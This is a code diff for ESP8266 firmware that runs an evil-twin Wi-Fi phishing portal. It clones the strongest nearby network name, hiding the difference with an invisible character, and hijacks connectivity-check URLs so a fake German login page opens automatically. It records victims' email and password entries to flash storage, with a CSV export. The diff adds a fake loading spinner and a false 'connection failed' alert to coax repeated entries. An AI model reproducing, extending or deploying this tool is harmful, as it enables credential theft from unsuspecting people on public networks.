@@ -1,18 +1,17 @@
 #include <ESP8266WiFi.h>
-#include <WiFiClient.h>
 #include <ESP8266WebServer.h>
 #include <DNSServer.h>
 #include <LittleFS.h>
 
-const char *web_password = "***"; //CHANGE ME
-const unsigned long SCAN_INTERVAL = 600000;
+const char *web_password = "***"; //CHANGE ME 
+const unsigned long SCAN_INTERVAL = 600000; 
 
 String currentSSID = "Free_WiFi";
 unsigned long lastScanTime = 0;
 
 const byte DNS_PORT = 53;
 DNSServer dnsServer;
-ESP8266WebServer server(80);
+ESP8266WebServer server(80); 
 
 const char *headerkeys[] = {"User-Agent"};
 size_t headerkeyssize = sizeof(headerkeys) / sizeof(char*);
@@ -26,7 +25,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <title>Anmeldung</title>
 <style>
   body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #1c1c1e; }
-  .card { background: white; padding: 2rem; border-radius: 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 360px; text-align: center; }
+  .card { background: white; padding: 2rem; border-radius: 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 360px; text-align: center; position: relative; }
   h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 600; }
   p { color: #8e8e93; font-size: 0.95rem; margin-bottom: 1.5rem; line-height: 1.4; }
   .ssid-name { color: #007AFF; font-weight: 700; word-break: break-all; }
@@ -35,14 +34,35 @@ const char index_html[] PROGMEM = R"rawliteral(
   button { width: 100%; padding: 14px; background-color: #007AFF; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 5px; }
   button:hover { background-color: #0056b3; }
   .footer { margin-top: 20px; font-size: 0.8rem; color: #c7c7cc; }
+  
+  #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); flex-direction: column; justify-content: center; align-items: center; z-index: 10; border-radius: 14px; }
+  .spinner { width: 40px; height: 40px; border: 4px solid rgba(0,122,255,0.2); border-left-color: #007AFF; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+  @keyframes spin { 100% { transform: rotate(360deg); } }
+  .load-text { font-weight: 600; font-size: 0.9rem; color: #007AFF; }
 </style>
+<script>
+  function simulateLoad(e) {
+    e.preventDefault();
+    const loader = document.getElementById('loader');
+    if(document.querySelector('input[type="password"]').value.length < 1) return;
+    
+    loader.style.display = 'flex';
+    
+    setTimeout(() => { e.target.submit(); }, 1800); 
+  }
+</script>
 </head>
 <body>
   <div class="card">
+    <div id="loader">
+      <div class="spinner"></div>
+      <div class="load-text">Verbindung wird geprüft...</div>
+    </div>
+    
     <h2>WLAN Anmeldung</h2>
     <p>Für den Zugang zu <span class="ssid-name">%SSID%</span> ist ein Konto erforderlich.</p>
-    <form action="/dashboard" method="POST">
-      <input type="text" name="email" placeholder="Identität / E-Mail" required>
+    <form action="/dashboard" method="POST" onsubmit="simulateLoad(event)">
+      <input type="text" name="email" placeholder="Identität / E-Mail" required autocomplete="email">
       <input type="password" name="password" placeholder="Passwort" required>
       <button type="submit">Verbinden</button>
     </form>
@@ -111,15 +131,42 @@ void scanAndSetSSID() {
   }
 
   if (strongestSSID != "") {
-    currentSSID = strongestSSID;
-    Serial.println("Neues Ziel-Netzwerk: " + currentSSID);
+    if (strongestSSID.length() <= 29) {
+      currentSSID = strongestSSID + "\xE2\x80\x8B"; 
+    } else {
+      currentSSID = strongestSSID + " "; 
+    }
+    Serial.println("Neues Ziel-Netzwerk (Invisible Char): " + currentSSID);
+  } else {
+    currentSSID = "Free_WiFi"; 
   }
 
   WiFi.mode(WIFI_AP);
+  WiFi.hostname("network-auth"); 
   WiFi.softAP(currentSSID.c_str());
   
   dnsServer.stop();
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+  
+  Serial.print("AP gestartet: ");
+  Serial.println(currentSSID);
+  Serial.print("IP Adresse: ");
+  Serial.println(WiFi.softAPIP());
+}
+
+boolean isCaptivePortal() {
+  if (!isIp(server.hostHeader()) && server.hostHeader() != (String("esp8266-portal.local"))) {
+    return true;
+  }
+  return false;
+}
+
+boolean isIp(String str) {
+  for (size_t i = 0; i < str.length(); i++) {
+    int c = str.charAt(i);
+    if (c != '.' && (c < '0' || c > '9')) return false;
+  }
+  return true;
 }
 
 void handleRoot() {
@@ -128,14 +175,13 @@ void handleRoot() {
   server.send(200, "text/html", html);
 }
 
-void handleClear() {
-  if (!server.hasArg("auth") || server.arg("auth") != web_password) {
-    server.send(403, "text/plain", "Verboten");
-    return;
+void handleNotFound() {
+  if (isCaptivePortal()) {
+    handleRoot(); 
+  } else {
+    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString());
+    server.send(302, "text/plain", "Redirect to Captive Portal");
   }
-  clearLogs();
-  server.sendHeader("Location", "/dashboard?auth=" + String(web_password));
-  server.send(302, "text/plain", "");
 }
 
 void handleDashboard() {
@@ -170,7 +216,11 @@ void handleDashboard() {
       String logData = emailInput + ";" + passwordInput + ";" + userAgent + ";" + currentSSID;
       saveLog(logData);
     }
-    server.send(200, "text/html", "<script>alert('Verbindung fehlgeschlagen. Bitte versuchen Sie es erneut.'); window.location.href='/';</script>");
+    
+    String html = index_html;
+    html.replace("%SSID%", currentSSID);
+    html.replace("</body>", "<script>alert('Verbindung fehlgeschlagen. Bitte versuchen Sie es erneut.');</script></body>");
+    server.send(200, "text/html", html);
   }
 }
 
@@ -193,8 +243,13 @@ void handleCSV() {
   server.send(200, "text/csv", output);
 }
 
-void handleNotFound() {
-  server.sendHeader("Location", String("http://") + server.client().localIP().toString());
+void handleClear() {
+  if (!server.hasArg("auth") || server.arg("auth") != web_password) {
+    server.send(403, "text/plain", "Verboten");
+    return;
+  }
+  clearLogs();
+  server.sendHeader("Location", "/dashboard?auth=" + String(web_password));
   server.send(302, "text/plain", "");
 }
 
@@ -206,6 +261,8 @@ void setup() {
     Serial.println("LittleFS Mount Failed - formatiere...");
     LittleFS.format();
     LittleFS.begin();
+  } else {
+    Serial.println("LittleFS Mounted");
   }
 
   scanAndSetSSID();
@@ -213,15 +270,22 @@ void setup() {
   server.collectHeaders(headerkeys, headerkeyssize);
 
   server.on("/", handleRoot);
+  server.on("/index.html", handleRoot);
   server.on("/dashboard", HTTP_ANY, handleDashboard);
   server.on("/csv", handleCSV);
   server.on("/clear", handleClear);
   
   server.on("/generate_204", handleRoot);
-  server.on("/fwlink", handleRoot);
+  server.on("/gen_204", handleRoot);
+  server.on("/hotspot-detect.html", handleRoot);
+  server.on("/ncsi.txt", handleRoot);
+  server.on("/connecttest.txt", handleRoot);
+  server.on("/success.txt", handleRoot);
+  
   server.onNotFound(handleNotFound);
 
   server.begin();
+  Serial.println("HTTP Server gestartet");
 }
 
 void loop() {
